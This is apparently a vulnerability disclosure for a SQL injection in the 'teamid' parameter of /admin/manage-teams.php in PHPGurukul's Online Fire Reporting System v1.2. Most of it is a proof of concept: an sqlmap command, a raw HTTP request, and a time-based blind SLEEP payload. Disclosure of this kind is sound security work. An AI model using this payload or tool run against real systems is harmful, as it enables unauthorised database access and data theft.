

# SQLi vulnerability in Online Fire Reporting System v1.2 of file /admin/manage-teams.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /admin/manage-teams.php

**Version**

- V1.2

### POC

```
sqlmap -r request.txt --level 5 --batch
```



```
GET /admin/manage-teams.php?teamid=100 HTTP/1.1
Host: www.firereport.top
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0, i
```



```
---
Parameter: teamid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: teamid=100'+(SELECT 0x47776c66 WHERE 8457=8457 AND (SELECT 2414 FROM (SELECT(SLEEP(5)))QMWA))+'
---
```

